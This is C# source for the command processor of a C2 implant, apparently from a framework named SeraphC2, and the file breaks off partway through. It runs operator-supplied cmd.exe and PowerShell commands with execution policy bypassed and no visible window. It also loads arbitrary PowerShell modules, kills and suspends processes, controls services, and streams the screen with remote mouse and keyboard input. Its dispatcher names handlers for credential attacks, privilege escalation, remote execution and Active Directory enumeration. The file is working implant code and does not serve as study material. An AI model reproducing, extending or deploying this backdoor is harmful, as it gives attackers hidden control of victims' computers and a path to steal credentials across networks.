using System.Diagnostics;
using System.Text;
using SeraphC2.Implant.Models;

namespace SeraphC2.Implant.Commands;

public class CommandProcessor : ICommandProcessor
{
    public async Task<CommandResult> ProcessCommandAsync(CommandMessage command)
    {
        var result = new CommandResult
        {
            CommandId = command.Id,
            ImplantId = command.ImplantId,
            Timestamp = DateTime.UtcNow
        };

        try
        {
            switch (command.Type.ToLowerInvariant())
            {
                case "shell":
                case "cmd":
                    result = await ExecuteShellCommandAsync(command, result);
                    break;
                
                case "powershell":
                case "ps":
                    result = await ExecutePowerShellCommandAsync(command, result);
                    break;
                
                case "sysinfo":
                    result = await GetSystemInfoAsync(command, result);
                    break;
                
                case "process_list":
                    result = await GetProcessListAsync(command, result);
                    break;
                
                case "process_kill":
                    result = await KillProcessAsync(command, result);
                    break;
                
                case "process_suspend":
                    result = await SuspendProcessAsync(command, result);
                    break;
                
                case "process_resume":
                    result = await ResumeProcessAsync(command, result);
                    break;
                
                case "service_list":
                    result = await GetServiceListAsync(command, result);
                    break;
                
                case "service_start":
                    result = await StartServiceAsync(command, result);
                    break;
                
                case "service_stop":
                    result = await StopServiceAsync(command, result);
                    break;
                
                case "service_restart":
                    result = await RestartServiceAsync(command, result);
                    break;
                
                case "service_config":
                    result = await ConfigureServiceAsync(command, result);
                    break;
                
                case "system_resources":
                    result = await GetSystemResourcesAsync(command, result);
                    break;
                
                case "screenshot":
                    result = await TakeScreenshotAsync(command, result);
                    break;
                
                case "screen_monitors":
                    result = await GetScreenMonitorsAsync(command, result);
                    break;
                
                case "screen_stream_start":
                    result = await StartScreenStreamAsync(command, result);
                    break;
                
                case "screen_stream_stop":
                    result = await StopScreenStreamAsync(command, result);
                    break;
                
                case "screen_stream_config":
                    result = await UpdateScreenStreamConfigAsync(command, result);
                    break;
                
                case "remote_desktop_mouse_click":
                    result = await ProcessMouseClickAsync(command, result);
                    break;
                
                case "remote_desktop_mouse_move":
                    result = await ProcessMouseMoveAsync(command, result);
                    break;
                
                case "remote_desktop_key_input":
                    result = await ProcessKeyboardInputAsync(command, result);
                    break;
                
                case "remote_desktop_disable_input":
                    result = await DisableLocalInputAsync(command, result);
                    break;
                
                case "remote_desktop_enable_input":
                    result = await EnableLocalInputAsync(command, result);
                    break;
                
                case "ping":
                    result = await PingAsync(command, result);
                    break;
                
                case "lateral_network_enum":
                    result = await EnumerateNetworkAsync(command, result);
                    break;
                
                case "lateral_credential_attack":
                    result = await CredentialAttackAsync(command, result);
                    break;
                
                case "lateral_remote_execute":
                    result = await RemoteExecuteAsync(command, result);
                    break;
                
                case "lateral_privilege_escalation":
                    result = await PrivilegeEscalationAsync(command, result);
                    break;
                
                case "lateral_ad_enum":
                    result = await EnumerateActiveDirectoryAsync(command, result);
                    break;
                
                default:
                    result.Success = false;
                    result.Error = $"Unknown command type: {command.Type}";
                    break;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = ex.Message;
            result.Output = $"Exception occurred: {ex}";
        }

        return result;
    }

    private async Task<CommandResult> ExecuteShellCommandAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command.Payload}",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            // Wait for process to complete with timeout
            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Command timed out after 30 seconds";
                result.ExitCode = -1;
                return result;
            }

            result.ExitCode = process.ExitCode;
            result.Output = outputBuilder.ToString();
            result.Error = errorBuilder.ToString();
            result.Success = process.ExitCode == 0;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = ex.Message;
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> ExecutePowerShellCommandAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            // Handle different PowerShell command types
            switch (command.Type.ToLowerInvariant())
            {
                case "powershell_script":
                    return await ExecutePowerShellScriptAsync(command, result);
                case "powershell_module_load":
                    return await LoadPowerShellModuleAsync(command, result);
                case "powershell_module_list":
                    return await ListPowerShellModulesAsync(command, result);
                default:
                    return await ExecuteBasicPowerShellAsync(command, result);
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = ex.Message;
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> ExecuteBasicPowerShellAsync(CommandMessage command, CommandResult result)
    {
        var processInfo = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-NoProfile -ExecutionPolicy Bypass -OutputFormat XML -Command \"{EscapePowerShellCommand(command.Payload)}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
            WorkingDirectory = Environment.CurrentDirectory
        };

        using var process = new Process { StartInfo = processInfo };
        var outputBuilder = new StringBuilder();
        var errorBuilder = new StringBuilder();

        process.OutputDataReceived += (sender, e) =>
        {
            if (!string.IsNullOrEmpty(e.Data))
                outputBuilder.AppendLine(e.Data);
        };

        process.ErrorDataReceived += (sender, e) =>
        {
            if (!string.IsNullOrEmpty(e.Data))
                errorBuilder.AppendLine(e.Data);
        };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        var completed = await Task.Run(() => process.WaitForExit(30000));
        
        if (!completed)
        {
            process.Kill();
            result.Success = false;
            result.Error = "PowerShell command timed out after 30 seconds";
            result.ExitCode = -1;
            return result;
        }

        result.ExitCode = process.ExitCode;
        result.Output = outputBuilder.ToString();
        result.Error = errorBuilder.ToString();
        result.Success = process.ExitCode == 0;

        // Try to parse XML output for structured data
        if (result.Success && !string.IsNullOrEmpty(result.Output))
        {
            result.Output = FormatPowerShellOutput(result.Output);
        }

        return result;
    }

    private async Task<CommandResult> ExecutePowerShellScriptAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var scriptData = System.Text.Json.JsonSerializer.Deserialize<PowerShellScriptData>(command.Payload);
            
            // Create temporary script file
            var tempScriptPath = Path.GetTempFileName() + ".ps1";
            await File.WriteAllTextAsync(tempScriptPath, scriptData.Script);

            var arguments = new StringBuilder();
            arguments.Append("-NoProfile -ExecutionPolicy Bypass -OutputFormat XML -File ");
            arguments.Append($"\"{tempScriptPath}\"");

            // Add parameters
            if (scriptData.Parameters != null && scriptData.Parameters.Count > 0)
            {
                foreach (var param in scriptData.Parameters)
                {
                    arguments.Append($" -{param.Key} \"{param.Value}\"");
                }
            }

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = arguments.ToString(),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(60000)); // Longer timeout for scripts
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "PowerShell script timed out after 60 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = FormatPowerShellOutput(outputBuilder.ToString());
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }

            // Clean up temporary file
            try
            {
                if (File.Exists(tempScriptPath))
                    File.Delete(tempScriptPath);
            }
            catch
            {
                // Ignore cleanup errors
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to execute PowerShell script: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> LoadPowerShellModuleAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var moduleData = System.Text.Json.JsonSerializer.Deserialize<PowerShellModuleData>(command.Payload);
            
            string psCommand;
            if (!string.IsNullOrEmpty(moduleData.ModuleContent))
            {
                // Load module from content
                var tempModulePath = Path.GetTempFileName() + ".psm1";
                await File.WriteAllTextAsync(tempModulePath, moduleData.ModuleContent);
                psCommand = $"Import-Module '{tempModulePath}' -Force; Get-Module '{Path.GetFileNameWithoutExtension(tempModulePath)}' | Select-Object Name, Version, ModuleType, ExportedCommands | ConvertTo-Json";
            }
            else
            {
                // Load module by name
                psCommand = $"Import-Module '{moduleData.ModuleName}' -Force; Get-Module '{moduleData.ModuleName}' | Select-Object Name, Version, ModuleType, ExportedCommands | ConvertTo-Json";
            }

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "PowerShell module load timed out after 30 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to load PowerShell module: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> ListPowerShellModulesAsync(CommandMessage command, CommandResult result)
    {
        var psCommand = "Get-Module -ListAvailable | Select-Object Name, Version, ModuleType, Description, Path | ConvertTo-Json";

        var processInfo = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
            WorkingDirectory = Environment.CurrentDirectory
        };

        using var process = new Process { StartInfo = processInfo };
        var outputBuilder = new StringBuilder();
        var errorBuilder = new StringBuilder();

        process.OutputDataReceived += (sender, e) =>
        {
            if (!string.IsNullOrEmpty(e.Data))
                outputBuilder.AppendLine(e.Data);
        };

        process.ErrorDataReceived += (sender, e) =>
        {
            if (!string.IsNullOrEmpty(e.Data))
                errorBuilder.AppendLine(e.Data);
        };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        var completed = await Task.Run(() => process.WaitForExit(30000));
        
        if (!completed)
        {
            process.Kill();
            result.Success = false;
            result.Error = "PowerShell module list timed out after 30 seconds";
            result.ExitCode = -1;
        }
        else
        {
            result.ExitCode = process.ExitCode;
            result.Output = outputBuilder.ToString();
            result.Error = errorBuilder.ToString();
            result.Success = process.ExitCode == 0;
        }

        return result;
    }

    private string EscapePowerShellCommand(string command)
    {
        return command.Replace("\"", "`\"").Replace("$", "`$");
    }

    private string FormatPowerShellOutput(string output)
    {
        if (string.IsNullOrEmpty(output))
            return output;

        // Try to detect and format XML output
        if (output.TrimStart().StartsWith("<?xml") || output.Contains("<Objs"))
        {
            try
            {
                // This is a simplified formatter - in a real implementation,
                // you'd want to properly parse PowerShell XML output
                return output;
            }
            catch
            {
                return output;
            }
        }

        return output;
    }

    private class PowerShellScriptData
    {
        public string Script { get; set; } = "";
        public Dictionary<string, object>? Parameters { get; set; }
    }

    private class PowerShellModuleData
    {
        public string ModuleName { get; set; } = "";
        public string? ModuleContent { get; set; }
    }

    private async Task<CommandResult> GetSystemInfoAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var info = new StringBuilder();
            info.AppendLine($"Hostname: {Environment.MachineName}");
            info.AppendLine($"Username: {Environment.UserDomainName}\\{Environment.UserName}");
            info.AppendLine($"OS Version: {Environment.OSVersion}");
            info.AppendLine($"Architecture: {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}");
            info.AppendLine($"Processor Count: {Environment.ProcessorCount}");
            info.AppendLine($"Working Directory: {Environment.CurrentDirectory}");
            info.AppendLine($"System Directory: {Environment.SystemDirectory}");
            info.AppendLine($"Uptime: {TimeSpan.FromMilliseconds(Environment.TickCount)}");

            result.Output = info.ToString();
            result.Success = true;
            result.ExitCode = 0;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = ex.Message;
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> GetProcessListAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var psCommand = @"
Get-Process | Select-Object Id, Name, Path, CommandLine, ParentId, SessionId, 
    @{Name='CPUUsage';Expression={$_.CPU}}, 
    @{Name='MemoryUsage';Expression={$_.WorkingSet64}}, 
    @{Name='WorkingSet';Expression={$_.WorkingSet64}}, 
    HandleCount, 
    @{Name='Threads';Expression={$_.Threads.Count}}, 
    StartTime, 
    @{Name='Owner';Expression={(Get-WmiObject -Class Win32_Process -Filter ""ProcessId=$($_.Id)"").GetOwner().User}},
    @{Name='Architecture';Expression={if($_.ProcessName -eq 'System'){''} else {try{[System.Diagnostics.ProcessModule]$_.MainModule.FileName | ForEach-Object{if([System.Environment]::Is64BitProcess){if([System.IO.Path]::GetDirectoryName($_) -like '*SysWOW64*'){'x86'}else{'x64'}}else{'x86'}}}catch{'Unknown'}}}},
    @{Name='Status';Expression={if($_.Responding){'Running'}else{'NotResponding'}}}
| ConvertTo-Json -Depth 2
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Process list command timed out after 30 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to get process list: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> KillProcessAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ProcessManagementData>(command.Payload);
            
            string psCommand;
            if (requestData.ProcessId.HasValue)
            {
                psCommand = $"Stop-Process -Id {requestData.ProcessId.Value} -Force; Write-Output 'Process {requestData.ProcessId.Value} terminated successfully'";
            }
            else if (!string.IsNullOrEmpty(requestData.ProcessName))
            {
                psCommand = $"Stop-Process -Name '{requestData.ProcessName}' -Force; Write-Output 'Process {requestData.ProcessName} terminated successfully'";
            }
            else
            {
                result.Success = false;
                result.Error = "Either ProcessId or ProcessName must be specified";
                return result;
            }

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(15000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Process kill command timed out after 15 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to kill process: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> SuspendProcessAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ProcessManagementData>(command.Payload);
            
            if (!requestData.ProcessId.HasValue)
            {
                result.Success = false;
                result.Error = "ProcessId must be specified for suspend operation";
                return result;
            }

            // Use Windows API to suspend process
            var psCommand = $@"
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessSuspender {{
    [DllImport(""kernel32.dll"")]
    static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    
    [DllImport(""kernel32.dll"")]
    static extern uint SuspendThread(IntPtr hThread);
    
    [DllImport(""kernel32.dll"")]
    static extern int CloseHandle(IntPtr hObject);
    
    public static void SuspendProcess(int processId) {{
        Process process = Process.GetProcessById(processId);
        foreach (ProcessThread thread in process.Threads) {{
            IntPtr pOpenThread = OpenThread(2, false, (uint)thread.Id);
            if (pOpenThread != IntPtr.Zero) {{
                SuspendThread(pOpenThread);
                CloseHandle(pOpenThread);
            }}
        }}
    }}
}}
'@
[ProcessSuspender]::SuspendProcess({requestData.ProcessId.Value})
Write-Output 'Process {requestData.ProcessId.Value} suspended successfully'
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(15000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Process suspend command timed out after 15 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to suspend process: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> ResumeProcessAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ProcessManagementData>(command.Payload);
            
            if (!requestData.ProcessId.HasValue)
            {
                result.Success = false;
                result.Error = "ProcessId must be specified for resume operation";
                return result;
            }

            // Use Windows API to resume process
            var psCommand = $@"
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessResumer {{
    [DllImport(""kernel32.dll"")]
    static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    
    [DllImport(""kernel32.dll"")]
    static extern uint ResumeThread(IntPtr hThread);
    
    [DllImport(""kernel32.dll"")]
    static extern int CloseHandle(IntPtr hObject);
    
    public static void ResumeProcess(int processId) {{
        Process process = Process.GetProcessById(processId);
        foreach (ProcessThread thread in process.Threads) {{
            IntPtr pOpenThread = OpenThread(2, false, (uint)thread.Id);
            if (pOpenThread != IntPtr.Zero) {{
                ResumeThread(pOpenThread);
                CloseHandle(pOpenThread);
            }}
        }}
    }}
}}
'@
[ProcessResumer]::ResumeProcess({requestData.ProcessId.Value})
Write-Output 'Process {requestData.ProcessId.Value} resumed successfully'
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(15000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Process resume command timed out after 15 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to resume process: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> GetServiceListAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var psCommand = @"
Get-Service | Select-Object Name, DisplayName, Status, StartType, ServiceType, 
    @{Name='Description';Expression={(Get-WmiObject -Class Win32_Service -Filter ""Name='$($_.Name)'"").Description}},
    @{Name='ExecutablePath';Expression={(Get-WmiObject -Class Win32_Service -Filter ""Name='$($_.Name)'"").PathName}},
    @{Name='LogOnAs';Expression={(Get-WmiObject -Class Win32_Service -Filter ""Name='$($_.Name)'"").StartName}},
    CanStop, CanPauseAndContinue
| ConvertTo-Json -Depth 2
";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(45000)); // Longer timeout for service enumeration
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Service list command timed out after 45 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to get service list: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> StartServiceAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ServiceManagementData>(command.Payload);
            
            if (string.IsNullOrEmpty(requestData.ServiceName))
            {
                result.Success = false;
                result.Error = "ServiceName must be specified";
                return result;
            }

            var psCommand = $"Start-Service -Name '{requestData.ServiceName}'; Write-Output 'Service {requestData.ServiceName} started successfully'";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Service start command timed out after 30 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to start service: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> StopServiceAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ServiceManagementData>(command.Payload);
            
            if (string.IsNullOrEmpty(requestData.ServiceName))
            {
                result.Success = false;
                result.Error = "ServiceName must be specified";
                return result;
            }

            var psCommand = $"Stop-Service -Name '{requestData.ServiceName}' -Force; Write-Output 'Service {requestData.ServiceName} stopped successfully'";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(30000));
            
            if (!completed)
            {
                process.Kill();
                result.Success = false;
                result.Error = "Service stop command timed out after 30 seconds";
                result.ExitCode = -1;
            }
            else
            {
                result.ExitCode = process.ExitCode;
                result.Output = outputBuilder.ToString();
                result.Error = errorBuilder.ToString();
                result.Success = process.ExitCode == 0;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.Error = $"Failed to stop service: {ex.Message}";
            result.ExitCode = -1;
        }

        return result;
    }

    private async Task<CommandResult> RestartServiceAsync(CommandMessage command, CommandResult result)
    {
        try
        {
            var requestData = System.Text.Json.JsonSerializer.Deserialize<ServiceManagementData>(command.Payload);
            
            if (string.IsNullOrEmpty(requestData.ServiceName))
            {
                result.Success = false;
                result.Error = "ServiceName must be specified";
                return result;
            }

            var psCommand = $"Restart-Service -Name '{requestData.ServiceName}' -Force; Write-Output 'Service {requestData.ServiceName} restarted successfully'";

            var processInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{EscapePowerShellCommand(psCommand)}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory
            };

            using var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    outputBuilder.AppendLine(e.Data);
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                    errorBuilder.AppendLine(e.Data);
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var completed = await Task.Run(() => process.WaitForExit(45000));
            
            if (!completed)
            {
                process.Kill();
